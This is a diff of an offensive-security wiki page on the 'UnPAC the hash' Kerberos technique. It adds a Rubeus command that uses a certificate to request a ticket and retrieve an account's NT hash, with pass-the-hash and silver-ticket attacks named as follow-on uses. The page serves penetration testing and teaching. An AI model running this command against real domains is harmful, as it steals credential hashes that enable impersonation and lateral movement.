@@ -1,4 +1,4 @@
-# UnPAC-the-hash
+# UnPAC the hash
 
 ## Theory
 
@@ -33,7 +33,11 @@ The NT hash can be used for [pass-the-hash](../ntlm/pth.md), [silver ticket](for
 {% endtab %}
 
 {% tab title="Windows" %}
-//Work in progress (use tools like Rubeus or kekeo)
+From Windows systems, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used to requesting a ticket using a certificate and use `/getcredentials` to retrieve the NT hash in the PAC.
+
+```bash
+Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
+```
 {% endtab %}
 {% endtabs %}
 
